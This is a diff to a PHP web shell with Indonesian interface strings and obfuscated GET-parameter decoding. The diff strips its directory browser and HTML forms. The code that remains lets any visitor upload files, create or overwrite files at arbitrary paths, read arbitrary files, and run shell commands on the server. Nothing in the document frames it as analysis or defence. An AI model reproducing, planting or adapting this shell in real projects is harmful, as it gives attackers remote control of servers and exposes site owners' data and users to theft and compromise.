@@ -156,7 +156,6 @@ textarea[name="file_content"] {
 <?php
 $timezone = date_default_timezone_get();
 date_default_timezone_set($timezone);
-$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
 $scriptDirectory = dirname(__FILE__);
 
 function x($b) {
@@ -169,14 +168,11 @@ function y($b) {
 
 foreach ($_GET as $c => $d) $_GET[$c] = y($d);
 
-$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
-chdir($currentDirectory);
-
 $viewCommandResult = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_FILES['fileToUpload'])) {
-        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
+        $target_file = basename($_FILES["fileToUpload"]["name"]);
         if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
             echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success";
         } else {
@@ -184,15 +180,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
         $fileName = $_POST['file_name'];
-        $newFile = $currentDirectory . '/' . $fileName;
-        if (!file_exists($newFile)) {
-            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+        if (!file_exists($fileName)) {
+            if (file_put_contents($fileName, $_POST['file_content']) !== false) {
                 echo '<hr>File created successfully!';
             } else {
                 echo '<hr>Error: Failed to create file!';
             }
         } else {
-            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+            if (file_put_contents($fileName, $_POST['file_content']) !== false) {
                 echo '<hr>File edited successfully!';
             } else {
                 echo '<hr>Error: Failed to edit file!';
@@ -221,7 +216,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
         }
     } elseif (isset($_POST['view_file'])) {
-        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+        $fileToView = $_POST['view_file'];
         if (file_exists($fileToView)) {
             $fileContent = file_get_contents($fileToView);
             $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
@@ -233,40 +228,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 echo "Zona waktu server: " . $timezone . "<br>";
 echo "Waktu server saat ini: " . date('Y-m-d H:i:s');
-echo '<hr>Curdir: ';
-
-echo '<br>';
-echo '<hr><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
-echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
-echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
-echo '<input type="submit" value="Create / Edit File">';
-echo '</form>';
-echo '<form method="post" enctype="multipart/form-data">';
-echo '<hr>';
-echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
-echo '<hr>';
-echo '<input type="submit" value="Upload File" name="submit">';
-echo '</form>';
-echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
 echo $viewCommandResult;
-echo '<div>';
-echo '</div>';
-echo '<table border=1>';
-echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
-foreach (scandir($currentDirectory) as $v) {
-    $u = realpath($v);
-    $s = stat($u);
-    $permission = substr(sprintf('%o', fileperms($u)), -4);
-    $writable = is_writable($u);
-    echo '<tr>
-            <td class="item-name">' . htmlspecialchars($v) . '</td>
-            <td class="size">' . filesize($u) . '</td>
-            <td class="date" style="text-align: center;">' . date('Y-m-d H:i:s', filemtime($u)) . '</td>
-            <td class="permission ' . ($writable ? 'writable' : 'not-writable') . '">' . $permission . '</td>
-            <td><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '"><input type="submit" value=" View "></form></td>
-        </tr>';
-}
-echo '</table>';
 ?>
 </div>
 </body>
